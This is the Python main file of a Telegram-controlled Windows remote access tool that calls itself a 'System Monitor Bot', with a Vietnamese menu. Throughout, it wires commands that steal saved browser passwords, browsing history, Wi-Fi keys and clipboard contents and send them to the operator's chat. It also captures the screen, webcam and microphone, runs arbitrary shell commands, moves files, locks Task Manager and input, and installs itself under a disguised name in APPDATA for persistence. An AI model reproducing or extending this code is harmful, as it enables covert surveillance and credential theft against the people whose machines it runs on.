"""
V10 - System Monitor Bot 

Main entry point with modular architecture

Developer: TsByin
Version: 11.0 (Refactored & Optimized)
"""

import sys
import os
import time
import threading
import logging
import socket
import platform
import subprocess
import psutil
import io
from datetime import datetime
from telebot import TeleBot, types

# Import our modules
from config import (
    API_TOKEN, ADMIN_ID, BASE_DIR, BLOCKED_FILE, SETTINGS_FILE,
    BROWSER_PATHS, MAX_WORKERS, logger, AUDIO_AVAILABLE, TTS_AVAILABLE,
    MONITOR_INTERVAL, CPU_ALERT_THRESHOLD, CPU_ALERT_COOLDOWN
)

from utils import (
    load_settings, save_settings, load_blocked_list, save_blocked_list,
    get_active_window_title, find_and_close_window, show_message_box,
    speak_text, get_installed_browsers, set_taskmgr_state, check_integrity,
    protect_folder, load_json_safe, save_json_safe, block_site, unblock_site,
    get_clipboard_contents, refresh_firewall_blocks
)

from grabber import (
    grab_passwords, grab_history_specific, grab_wifi_passwords, save_wifi_to_file
)

from media import (
    smart_screenshot, capture_webcam, record_audio, record_screen,
    get_media_file_size, cleanup_media_file
)

from monitor import SystemMonitor, BotStats

# ==============================================================================
# GLOBAL STATE
# ==============================================================================

config = {
    'MONITOR_INTERVAL': MONITOR_INTERVAL,
    'CPU_ALERT_THRESHOLD': CPU_ALERT_THRESHOLD,
    'CPU_ALERT_COOLDOWN': CPU_ALERT_COOLDOWN,
}

bot = TeleBot(API_TOKEN)
bot_stats = BotStats()
monitor = None
upload_state = {}

# State variables
intrusion_alert_active = False
block_mode_active = False
taskmgr_locked = False

# Load data
BLOCKED_DATA = load_blocked_list(BLOCKED_FILE)
CURRENT_SETTINGS = load_settings(SETTINGS_FILE)

logger.info(f"✅ Bot initialized for Admin: {ADMIN_ID}")

# ==============================================================================
# BOT MENUS
# ==============================================================================

def send_reply_menu(m):
    """Send Reply Keyboard Menu"""
    mk = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    mk.add("🔑 Lấy Passwords", "🌐 Lịch Sử Web")
    mk.add("🖼 Chụp Màn Hình", "📸 Webcam")
    mk.add("🎤 Ghi Âm (10s)", "🎥 Quay MH (10s)")
    mk.add("🚫 Chặn App/Web", "🔒 Khóa TaskMgr")
    mk.add("⚙️ QL Tiến Trình", "🚀 Chạy Lệnh")
    mk.add("🔄 Khởi động lại", "🛑 Tắt máy")
    mk.add("📂 Duyệt File", "🚨 Cảnh Báo (Toggle)")
    mk.add("📶 Wi-Fi", "📋 Clipboard")
    mk.add("📍 Vị Trí IP", "🧱 Khóa Input")
    mk.add("💓 Kiểm Tra Bot")
    
    bot.send_message(m.chat.id, "🛡️ **CONTROL PANEL V10**", reply_markup=mk, parse_mode="Markdown")



# ==============================================================================
# COMMAND HANDLERS
# ==============================================================================

@bot.message_handler(commands=['start', 'menu'])
def menu_handler(m):
    """Handle /start and /menu commands"""
    if m.from_user.id != ADMIN_ID:
        return
    
    try:
        send_reply_menu(m)
    except Exception as e:
        logger.error(f"menu_handler failed: {e}")

@bot.message_handler(commands=['help'])
def help_handler(m):
    """Help command"""
    if m.from_user.id != ADMIN_ID:
        return
    
    text = (
        "ℹ️ **LỆNH:**\n"
        "/block app <tên.exe>\n"
        "/block site <domain>\n"
        "/unblock app/site <tên>\n"
        "/say <text>\n"
        "/msg <text>\n"
        "/kill <pid>\n"
        "/stats"
    )
    bot.send_message(m.chat.id, text, parse_mode="Markdown")

# ==============================================================================
# STATUS & STATS
# ==============================================================================

@bot.message_handler(func=lambda m: m.text == "💓 Kiểm Tra Bot")
def check_status(m):
    """Check bot status"""
    if m.from_user.id != ADMIN_ID:
        return
    
    try:
        msg = (
            f"🟢 **ONLINE**\n"
            f"⏱ Uptime: {bot_stats.get_stats()['uptime']}\n"
            f"💻 Host: {socket.gethostname()}\n"
            f"🧠 CPU: {bot_stats.get_stats()['cpu']}% | "
            f"💾 RAM: {bot_stats.get_stats()['ram']}%\n"
            f"🔒 TaskMgr: {'LOCKED' if taskmgr_locked else 'OPEN'}"
        )
        bot.reply_to(m, msg, parse_mode="Markdown")
        bot_stats.increment_command()
    except Exception as e:
        logger.error(f"check_status failed: {e}")
        bot.reply_to(m, f"❌ Error: {e}")

@bot.message_handler(commands=['stats'])
def show_stats(m):
    """Show detailed statistics"""
    if m.from_user.id != ADMIN_ID:
        return
    
    try:
        msg = bot_stats.get_stats_message()
        bot.send_message(m.chat.id, msg, parse_mode="Markdown")
        bot_stats.increment_command()
    except Exception as e:
        logger.error(f"show_stats failed: {e}")

# ==============================================================================
# PASSWORD & HISTORY
# ==============================================================================

@bot.message_handler(func=lambda m: m.text == "🔑 Lấy Passwords")
def h_pass(m):
    """Extract and send passwords from all profiles"""
    if m.from_user.id != ADMIN_ID:
        return
    
    def task():
        try:
            bot.send_message(m.chat.id, "⏳ Đang trích xuất mật khẩu từ tất cả profiles...")
            outfiles = grab_passwords(BROWSER_PATHS, compress=True, max_workers=MAX_WORKERS)
            
            if outfiles:
                # outfiles is now a list of files
                if not isinstance(outfiles, list):
                    outfiles = [outfiles]
                
                for outfile in outfiles:
                    try:
                        with open(outfile, 'rb') as f:
                            bot.send_document(m.chat.id, f, caption=f"📄 {os.path.basename(outfile)}")
                        cleanup_media_file(outfile)
                        bot_stats.increment_command()
                        logger.info(f"Password file sent: {outfile}")
                    except Exception as e:
                        logger.error(f"Send password file failed: {e}")
                        bot.send_message(m.chat.id, f"❌ Lỗi gửi file: {outfile}")
            else:
                bot.send_message(m.chat.id, "❌ Không tìm thấy mật khẩu")
        except Exception as e:
            logger.error(f"h_pass failed: {e}")
            bot.send_message(m.chat.id, f"❌ Lỗi: {e}")
    
    threading.Thread(target=task, daemon=True).start()

@bot.message_handler(func=lambda m: m.text == "🌐 Lịch Sử Web")
def h_history_menu(m):
    """History with default limit (500 pages from all browsers & profiles)"""
    if m.from_user.id != ADMIN_ID:
        return
    
    def task():
        try:
            bot.send_message(m.chat.id, "⏳ Đang trích xuất lịch sử web (500 trang) từ tất cả profiles...")
            outfiles = grab_history_specific(BROWSER_PATHS, browser_name=None, limit=500)
            
            if outfiles:
                if not isinstance(outfiles, list):
                    outfiles = [outfiles]
                
                for outfile in outfiles:
                    try:
                        with open(outfile, 'rb') as f:
                            bot.send_document(m.chat.id, f, caption=f"📄 {os.path.basename(outfile)}")
                        cleanup_media_file(outfile)
                        bot_stats.increment_command()
                        logger.info(f"History file sent: {outfile}")
                    except Exception as e:
                        logger.error(f"Send history file failed: {e}")
                        bot.send_message(m.chat.id, f"❌ Lỗi gửi file: {outfile}")
            else:
                bot.send_message(m.chat.id, "❌ Không tìm thấy lịch sử web")
        except Exception as e:
            logger.error(f"h_history_menu failed: {e}")
            bot.send_message(m.chat.id, f"❌ Lỗi: {e}")
    
    threading.Thread(target=task, daemon=True).start()

# ==============================================================================
# MEDIA CAPTURE
# ==============================================================================

@bot.message_handler(func=lambda m: m.text == "🖼 Chụp Màn Hình")
def h_scr(m):
    """Screenshot"""
    if m.from_user.id != ADMIN_ID:
        return
    
    try:
        img_data = smart_screenshot()
        if img_data:
            bio = io.BytesIO(img_data)
            bio.name = "screenshot.png"
            bot.send_document(m.chat.id, bio, caption="🖼 Screenshot")
            bot_stats.increment_command()
        else:
            bot.send_message(m.chat.id, "❌ Lỗi chụp màn hình")
    except Exception as e:
        logger.error(f"h_scr failed: {e}")

@bot.message_handler(func=lambda m: m.text == "📸 Webcam")
def h_cam(m):
    """Webcam capture"""
    if m.from_user.id != ADMIN_ID:
        return
    
    try:
        # Temporarily disable intrusion alert if active
        global intrusion_alert_active
        wa = intrusion_alert_active
        if wa:
            intrusion_alert_active = False
            time.sleep(1)
        
        img_data = capture_webcam()
        if img_data:
            bot.send_photo(m.chat.id, img_data)
            bot_stats.increment_command()
        else:
            bot.send_message(m.chat.id, "❌ Lỗi webcam")
        
        if wa:
            intrusion_alert_active = True
    except Exception as e:
        logger.error(f"h_cam failed: {e}")

@bot.message_handler(func=lambda m: m.text == "🎤 Ghi Âm (10s)")
def h_aud(m):
    """Record audio"""
    if m.from_user.id != ADMIN_ID:
        return
    
    if not AUDIO_AVAILABLE:
        bot.send_message(m.chat.id, "❌ Thiếu Audio Driver")
        return
    
    def task():
        try:
            bot.send_message(m.chat.id, "🎙 Ghi âm...")
            if record_audio(10, "rec.wav"):
                with open("rec.wav", 'rb') as f:
                    bot.send_voice(m.chat.id, f)
                cleanup_media_file("rec.wav")
                bot_stats.increment_command()
            else:
                bot.send_message(m.chat.id, "❌ Lỗi ghi âm")
        except Exception as e:
            logger.error(f"h_aud task failed: {e}")
    
    threading.Thread(target=task, daemon=True).start()

@bot.message_handler(func=lambda m: m.text == "🎥 Quay MH (10s)")
def h_vid(m):
    """Record screen"""
    if m.from_user.id != ADMIN_ID:
        return
    
    def task():
        try:
            bot.send_message(m.chat.id, "🎥 Quay video...")
            if record_screen(10, "screen.avi"):
                with open("screen.avi", 'rb') as f:
                    bot.send_document(m.chat.id, f)
                cleanup_media_file("screen.avi")
                bot_stats.increment_command()
            else:
                bot.send_message(m.chat.id, "❌ Lỗi quay video")
        except Exception as e:
            logger.error(f"h_vid task failed: {e}")
    
    threading.Thread(target=task, daemon=True).start()

# ==============================================================================
# BLOCKING & CONTROL
# ==============================================================================

@bot.message_handler(func=lambda m: m.text == "🚫 Chặn App/Web")
def toggle_block(m):
    """Toggle blocking mode"""
    if m.from_user.id != ADMIN_ID:
        return
    
    try:
        global block_mode_active
        block_mode_active = not block_mode_active
        if monitor:
            monitor.update_flags(block_mode=block_mode_active)
        
        status = "🟢 BẬT" if block_mode_active else "🔴 TẮT"
        bot.send_message(m.chat.id, f"🛡️ Chế độ Chặn: {status}")
        bot_stats.increment_command()
        logger.info(f"Block mode toggled: {block_mode_active}")
    except Exception as e:
        logger.error(f"toggle_block failed: {e}")

@bot.message_handler(func=lambda m: m.text == "🔒 Khóa TaskMgr")
def toggle_taskmgr(m):
    """Toggle TaskMgr lock"""
    if m.from_user.id != ADMIN_ID:
        return
    
    try:
        global taskmgr_locked
        taskmgr_locked = not taskmgr_locked
        set_taskmgr_state(enable=not taskmgr_locked)
        if monitor:
            monitor.update_flags(taskmgr_locked=taskmgr_locked)
        
        status = "🔴 ĐÃ KHÓA" if taskmgr_locked else "🟢 ĐÃ MỞ"
        bot.send_message(m.chat.id, f"🛡️ Task Manager: {status}")
        bot_stats.increment_command()
        logger.info(f"TaskMgr locked: {taskmgr_locked}")
    except Exception as e:
        logger.error(f"toggle_taskmgr failed: {e}")

@bot.message_handler(func=lambda m: m.text == "🚨 Cảnh Báo (Toggle)")
def h_alert(m):
    """Toggle intrusion alert"""
    if m.from_user.id != ADMIN_ID:
        return
    
    try:
        global intrusion_alert_active
        intrusion_alert_active = not intrusion_alert_active
        if monitor:
            monitor.update_flags(intrusion_alert=intrusion_alert_active)
        
        status = "BẬT" if intrusion_alert_active else "TẮT"
        bot.send_message(m.chat.id, f"🚨 Cảnh báo xâm nhập: {status}")
        bot_stats.increment_command()
        logger.info(f"Intrusion alert toggled: {intrusion_alert_active}")
    except Exception as e:
        logger.error(f"h_alert failed: {e}")

# ==============================================================================
# FILE BROWSER
# ==============================================================================

def list_dir(cid, path):
    """List directory contents"""
    mk = types.InlineKeyboardMarkup()
    
    try:
        items = os.listdir(path)
        mk.add(types.InlineKeyboardButton("🔙 Lên", callback_data=f"d|{os.path.dirname(path)}"))
        mk.add(types.InlineKeyboardButton("⬇️ Tải file lên đây", callback_data=f"up|{path}"))
        
        for i in items[:8]:
            p = os.path.join(path, i)
            if os.path.isdir(p):
                mk.add(types.InlineKeyboardButton(f"📁 {i}", callback_data=f"d|{p}"))
            else:
                mk.add(types.InlineKeyboardButton(f"📄 {i}", callback_data=f"f|{p}"))
        
        bot.send_message(cid, f"📂 {path}", reply_markup=mk)
    except Exception as e:
        logger.error(f"list_dir failed: {e}")
        bot.send_message(cid, f"❌ Lỗi: {e}")

@bot.message_handler(func=lambda m: m.text == "📂 Duyệt File")
def h_exp(m):
    """File explorer"""
    if m.from_user.id != ADMIN_ID:
        return
    
    try:
        list_dir(m.chat.id, "C:\\")
        bot_stats.increment_command()
    except Exception as e:
        logger.error(f"h_exp failed: {e}")

# ==============================================================================
# SYSTEM COMMANDS
# ==============================================================================

@bot.message_handler(commands=['kill'])
def cmd_kill(m):
    """Kill process by PID"""
    if m.from_user.id != ADMIN_ID:
        return
    
    try:
        pid = int(m.text.split()[1])
        psutil.Process(pid).terminate()
        bot.reply_to(m, f"✅ Terminated PID {pid}")
        bot_stats.increment_command()
    except Exception as e:
        logger.error(f"cmd_kill failed: {e}")
        bot.reply_to(m, f"❌ Error: {e}")

@bot.message_handler(commands=['cmd'])
def run_shell(m):
    """Execute shell command"""
    if m.from_user.id != ADMIN_ID:
        return
    
    try:
        cmd = m.text[5:]
        result = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, timeout=10)
        output = result.decode('cp850', errors='ignore')
        
        bot.reply_to(m, f"```\n{output[:4000]}\n```", parse_mode="Markdown")
        bot_stats.increment_command()
    except Exception as e:
        logger.error(f"run_shell failed: {e}")
        bot.reply_to(m, f"❌ Error: {e}")

@bot.message_handler(func=lambda m: m.text == "⚙️ QL Tiến Trình")
def h_proc(m):
    """Show top processes"""
    if m.from_user.id != ADMIN_ID:
        return
    
    try:
        p_list = sorted(
            [p.info for p in psutil.process_iter(['pid', 'name', 'cpu_percent'])],
            key=lambda x: x['cpu_percent'],
            reverse=True
        )[:15]
        
        msg = "⚙️ **TOP 15 PROCESS**\n"
        msg += "\n".join([f"`{p['pid']}` {p['name']} ({p['cpu_percent']}%)" for p in p_list])
        msg += "\n\n/kill <pid> tắt"
        
        bot.send_message(m.chat.id, msg, parse_mode="Markdown")
        bot_stats.increment_command()
    except Exception as e:
        logger.error(f"h_proc failed: {e}")

@bot.message_handler(func=lambda m: m.text == "🚀 Chạy Lệnh")
def h_cmd(m):
    """Interactive shell command handler - Ask for command"""
    if m.from_user.id != ADMIN_ID:
        return
    
    try:
        bot.send_message(m.chat.id, "🖥️ Gửi lệnh shell (ví dụ: `dir`, `ipconfig`, `tasklist`):", parse_mode="Markdown")
        bot.register_next_step_handler(m, process_cmd)
        bot_stats.increment_command()
    except Exception as e:
        logger.error(f"h_cmd failed: {e}")

def process_cmd(m):
    """Process shell command"""
    if m.from_user.id != ADMIN_ID:
        return
    
    try:
        if m.text.startswith('/'):
            return
        
        # Run command with timeout
        import subprocess
        result = subprocess.run(m.text, shell=True, capture_output=True, text=True, timeout=10, encoding='cp850', errors='ignore')
        
        output = result.stdout if result.stdout else "(No output)"
        if len(output) > 4000:
            with open("cmd_output.txt", "w", encoding="utf-8") as f:
                f.write(output)
            bot.send_document(m.chat.id, open("cmd_output.txt", 'rb'), caption=f"Output: {m.text}")
            import os
            os.remove("cmd_output.txt")
        else:
            bot.send_message(m.chat.id, f"```\n{output}\n```", parse_mode="Markdown")
    except subprocess.TimeoutExpired:
        bot.send_message(m.chat.id, "⏱️ Lệnh timeout (>10s)")
    except Exception as e:
        bot.send_message(m.chat.id, f"❌ Lỗi: {str(e)}")


def send_power_confirmation(chat_id, action):
    """Send confirmation inline buttons for shutdown/restart"""
    label = "Khởi động lại" if action == "reboot" else "Tắt máy"
    mk = types.InlineKeyboardMarkup()
    mk.add(
        types.InlineKeyboardButton(f"✅ Có, {label.lower()}", callback_data=f"power|{action}|yes"),
        types.InlineKeyboardButton("❌ Hủy", callback_data="power|cancel")
    )
    bot.send_message(chat_id, f"⚠️ Xác nhận {label}?", reply_markup=mk)

@bot.message_handler(func=lambda m: m.text == "🔄 Khởi động lại")
def h_res(m):
    """Reboot system"""
    if m.from_user.id != ADMIN_ID:
        return
    
    try:
        send_power_confirmation(m.chat.id, "reboot")
        bot_stats.increment_command()
    except Exception as e:
        logger.error(f"h_res failed: {e}")

@bot.message_handler(func=lambda m: m.text == "🛑 Tắt máy")
def h_off(m):
    """Shutdown system"""
    if m.from_user.id != ADMIN_ID:
        return
    
    try:
        send_power_confirmation(m.chat.id, "shutdown")
        bot_stats.increment_command()
    except Exception as e:
        logger.error(f"h_off failed: {e}")

@bot.message_handler(commands=['say'])
def h_say(m):
    """Text-to-speech"""
    if m.from_user.id != ADMIN_ID:
        return
    
    if not TTS_AVAILABLE:
        bot.reply_to(m, "❌ TTS not available")
        return
    
    def task():
        try:
            text = m.text[5:]
            speak_text(text)
            bot_stats.increment_command()
        except Exception as e:
            logger.error(f"h_say task failed: {e}")
    
    threading.Thread(target=task, daemon=True).start()

@bot.message_handler(commands=['msg'])
def h_msg(m):
    """Show message box"""
    if m.from_user.id != ADMIN_ID:
        return
    
    def task():
        try:
            text = m.text[5:]
            show_message_box(text)
            bot_stats.increment_command()
        except Exception as e:
            logger.error(f"h_msg task failed: {e}")
    
    threading.Thread(target=task, daemon=True).start()

# ==============================================================================
# WIFI & UTILITIES
# ==============================================================================

@bot.message_handler(func=lambda m: m.text == "📶 Wi-Fi")
def h_wifi(m):
    """Get WiFi passwords"""
    if m.from_user.id != ADMIN_ID:
        return
    
    def task():
        try:
            bot.send_message(m.chat.id, "⏳ Đang trích xuất WiFi...")
            wifi_data = grab_wifi_passwords()
            
            if wifi_data:
                outfile = save_wifi_to_file(wifi_data)
                with open(outfile, 'rb') as f:
                    bot.send_document(m.chat.id, f)
                cleanup_media_file(outfile)
                bot_stats.increment_command()
            else:
                bot.send_message(m.chat.id, "❌ Không tìm thấy WiFi")
        except Exception as e:
            logger.error(f"h_wifi task failed: {e}")
            bot.send_message(m.chat.id, f"❌ Lỗi: {e}")
    
    threading.Thread(target=task, daemon=True).start()

@bot.message_handler(func=lambda m: m.text == "📋 Clipboard")
def h_clip(m):
    """Get clipboard"""
    if m.from_user.id != ADMIN_ID:
        return
    
    try:
        data = get_clipboard_contents()
        sent_any = False

        clip_text = data.get("text")
        files = data.get("files") or []
        image_bytes = data.get("image")

        if clip_text:
            if len(clip_text) > 3500:
                with open("clipboard.txt", "w", encoding="utf-8") as f:
                    f.write(clip_text)
                with open("clipboard.txt", "rb") as f:
                    bot.send_document(m.chat.id, f, caption="📋 Clipboard (full text)")
                cleanup_media_file("clipboard.txt")
            else:
                bot.send_message(m.chat.id, f"📋 **Clipboard Text:**\n```\n{clip_text}\n```", parse_mode="Markdown")
            sent_any = True

        if files:
            files_list = "\n".join(files)
            bot.send_message(m.chat.id, f"📂 **Clipboard Files:**\n```\n{files_list}\n```", parse_mode="Markdown")
            sent_any = True

        if image_bytes:
            bio = io.BytesIO(image_bytes)
            bio.name = "clipboard.png"
            bot.send_document(m.chat.id, bio, caption="🖼 Clipboard Image")
            sent_any = True

        if not sent_any:
            bot.send_message(m.chat.id, "⚠️ Clipboard trống hoặc định dạng không hỗ trợ.")

        bot_stats.increment_command()
    except Exception as e:
        logger.error(f"h_clip failed: {e}")

@bot.message_handler(func=lambda m: m.text == "📍 Vị Trí IP")
def h_loc(m):
    """Get IP location"""
    if m.from_user.id != ADMIN_ID:
        return
    
    try:
        import requests
        r = requests.get("http://ip-api.com/json/", timeout=5).json()
        bot.send_message(m.chat.id, f"🌍 IP: {r['query']}\nTP: {r['city']}\nISP: {r['isp']}")
        bot_stats.increment_command()
    except Exception as e:
        logger.error(f"h_loc failed: {e}")
        bot.send_message(m.chat.id, "❌ Lỗi IP")

@bot.message_handler(func=lambda m: m.text == "🧱 Khóa Input")
def h_blockinput(m):
    """Lock input"""
    if m.from_user.id != ADMIN_ID:
        return
    
    def task():
        try:
            import ctypes
            bot.send_message(m.chat.id, "🧱 Đang khóa 10s...")
            ctypes.windll.user32.BlockInput(True)
            time.sleep(10)
            ctypes.windll.user32.BlockInput(False)
            bot.send_message(m.chat.id, "🔓 Mở")
            bot_stats.increment_command()
        except Exception as e:
            logger.error(f"h_blockinput task failed: {e}")
    
    threading.Thread(target=task, daemon=True).start()

# ==============================================================================
# BLOCKING MANAGEMENT
# ==============================================================================

@bot.message_handler(commands=['block', 'unblock'])
def block_mgr(m):
    """Manage blocked apps/sites"""
    if m.from_user.id != ADMIN_ID:
        return
    
    try:
        parts = m.text.split()
        if len(parts) < 3:
            bot.reply_to(m, "❌ Sai cú pháp: /block app <item1> <item2> ...")
            return
        
        cmd, type_, targets = parts[0], parts[1], parts[2:]
        if type_ not in ("app", "site"):
            bot.reply_to(m, "❌ Loại phải là app hoặc site")
            return
        key = "apps" if type_ == "app" else "sites"
        targets = [t.lower() for t in targets if t.strip()]
        if not targets:
            bot.reply_to(m, "❌ Chưa có tên để chặn/gỡ")
            return
        
        added = []
        existed = []
        removed = []
        missing = []
        failed = []
        
        if cmd == "/block":
            for t in targets:
                if t not in BLOCKED_DATA[key]:
                    BLOCKED_DATA[key].append(t)
                    if type_ == "site" and not block_site(t):
                        failed.append(t)
                        continue
                    added.append(t)
                else:
                    existed.append(t)
            save_blocked_list(BLOCKED_FILE, BLOCKED_DATA)
        else:  # unblock
            for t in targets:
                if t in BLOCKED_DATA[key]:
                    BLOCKED_DATA[key].remove(t)
                    if type_ == "site" and not unblock_site(t):
                        failed.append(t)
                        continue
                    removed.append(t)
                else:
                    missing.append(t)
            save_blocked_list(BLOCKED_FILE, BLOCKED_DATA)
        
        messages = []
        if added:
            messages.append("✅ Đã chặn: " + ", ".join(added))
        if removed:
            messages.append("🗑 Đã gỡ: " + ", ".join(removed))
        if existed:
            messages.append("⚠️ Đã có: " + ", ".join(existed))
        if missing:
            messages.append("⚠️ Không thấy: " + ", ".join(missing))
        if failed:
            messages.append("⚠️ Thao tác thất bại (cần quyền admin hosts/firewall?): " + ", ".join(failed))
        
        if messages:
            bot.reply_to(m, "\n".join(messages))
        else:
            bot.reply_to(m, "ℹ️ Không có thay đổi.")
        
        bot_stats.increment_command()
    except Exception as e:
        logger.error(f"block_mgr failed: {e}")
        bot.reply_to(m, f"❌ Lỗi: {e}")

# ==============================================================================
# CALLBACK HANDLER
# ==============================================================================

@bot.message_handler(content_types=['document'])
def handle_upload(m):
    """Handle file upload"""
    if m.from_user.id != ADMIN_ID:
        return
    
    if m.chat.id not in upload_state:
        return
    
    try:
        if m.document.file_size / (1024 * 1024) > 19.5:
            bot.reply_to(m, "❌ File > 20MB")
            return
        
        target_dir = upload_state[m.chat.id]
        file_name = m.document.file_name
        
        bot.reply_to(m, "⏳ Đang tải...")
        file_info = bot.get_file(m.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        
        filepath = os.path.join(target_dir, file_name)
        with open(filepath, 'wb') as f:
            f.write(downloaded_file)
        
        bot.reply_to(m, f"✅ Đã lưu vào `{target_dir}`", parse_mode="Markdown")
        del upload_state[m.chat.id]
        bot_stats.increment_command()
        logger.info(f"File uploaded: {filepath}")
    
    except Exception as e:
        logger.error(f"File upload failed: {e}")
        bot.reply_to(m, f"❌ Lỗi: {e}")

# ==============================================================================
# CALLBACK HANDLER (File browser only)
# ==============================================================================

@bot.callback_query_handler(func=lambda c: c.from_user.id == ADMIN_ID)
def cb_handler(c):
    """Callback handler for file browser (d| and f| callbacks)"""
    data = c.data
    msg = c.message
    cid = msg.chat.id
    
    try:
        # Power confirmation callbacks
        if data.startswith("power|"):
            parts = data.split("|")
            action = parts[1] if len(parts) > 1 else ""
            decision = parts[2] if len(parts) > 2 else ""

            bot.answer_callback_query(c.id, "✅")
            if decision == "yes":
                cmd = "shutdown /r /t 5" if action == "reboot" else "shutdown /s /t 5"
                os.system(cmd)
                bot.send_message(cid, "🛑 Đang thực hiện, hệ thống sẽ tắt/khởi động lại sau 5 giây.")
            else:
                bot.send_message(cid, "❌ Đã hủy yêu cầu.")
            return

        # Directory browse
        if data.startswith("d|"):
            path = data.split("|", 1)[1]
            bot.answer_callback_query(c.id, "✅")
            try:
                bot.delete_message(cid, msg.message_id)
            except:
                pass
            list_dir(cid, path)
            return
        
        # File download
        if data.startswith("f|"):
            filepath = data.split("|", 1)[1]
            bot.answer_callback_query(c.id, "Đang tải file...")
            
            def download_task():
                try:
                    with open(filepath, 'rb') as f:
                        bot.send_document(cid, f)
                    logger.info(f"File sent: {filepath}")
                except Exception as e:
                    logger.error(f"File download failed: {e}")
                    bot.send_message(cid, f"❌ Lỗi tải file: {e}")
            
            threading.Thread(target=download_task, daemon=True).start()
            return
        
        # File upload
        if data.startswith("up|"):
            target_path = data.split("|", 1)[1]
            upload_state[cid] = target_path
            bot.answer_callback_query(c.id, "✅")
            bot.send_message(cid, 
                            f"📤 Hãy gửi file (<20MB) để lưu vào: `{target_path}`", 
                            parse_mode="Markdown")
            return
        
        # Unknown callback
        logger.warning(f"❌ Unknown callback: {data}")
        bot.answer_callback_query(c.id, "❌ Lệnh không nhận diện")
    
    except Exception as e:
        logger.error(f"❌ Callback handler error: {e}", exc_info=True)
        try:
            bot.answer_callback_query(c.id, f"❌ Lỗi: {str(e)[:50]}")
        except:
            pass

# ==============================================================================
# MAIN
# ==============================================================================

if __name__ == "__main__":
    try:
        # Check persistence
        appdata = os.getenv('APPDATA')
        target_dir = os.path.join(appdata, "Microsoft", "Windows", "SystemMonitor")
        current_exe = sys.executable if getattr(sys, 'frozen', False) else __file__
        target_exe = os.path.join(target_dir, "SystemCheck.exe")
        
        check_integrity(target_dir, target_exe, current_exe)
        
        # Start monitor thread
        monitor = SystemMonitor(ADMIN_ID, bot, config)
        monitor_thread = threading.Thread(target=monitor.run, daemon=True)
        monitor_thread.start()

        # Periodic firewall refresh for blocked sites (CDN IPs may change)
        def firewall_refresh_loop():
            while True:
                try:
                    refresh_firewall_blocks(BLOCKED_DATA.get("sites", []))
                except Exception as e:
                    logger.error(f"Firewall refresh loop error: {e}")
                time.sleep(1800)  # 30 minutes

        threading.Thread(target=firewall_refresh_loop, daemon=True).start()
        
        logger.info(f"✅ Bot Started. ID: {ADMIN_ID}")
        logger.info(f"🟢 SYSTEM ONLINE | Host: {platform.node()}")
        
        try:
            bot.send_message(
                ADMIN_ID,
                f"🟢 **SYSTEM ONLINE**\n"
                f"Host: {platform.node()}\n"
                f"IP: {socket.gethostbyname(socket.gethostname())}",
                parse_mode="Markdown"
            )
        except:
            pass
        
        # Polling
        while True:
            try:
                bot.infinity_polling(timeout=10, long_polling_timeout=5, skip_pending=True)
            except Exception as e:
                logger.error(f"Polling error: {e}", exc_info=True)
                time.sleep(5)
    
    except Exception as e:
        logger.critical(f"Fatal error: {e}", exc_info=True)
        sys.exit(1)

# ═══════════════════════════════════════════════════════════════
# Developer: TsByin
# Project: V10 System Monitor Bot - Refactored & Optimized
# Version: 10.0 (Modular Architecture with Concurrent Operations)
# ═══════════════════════════════════════════════════════════════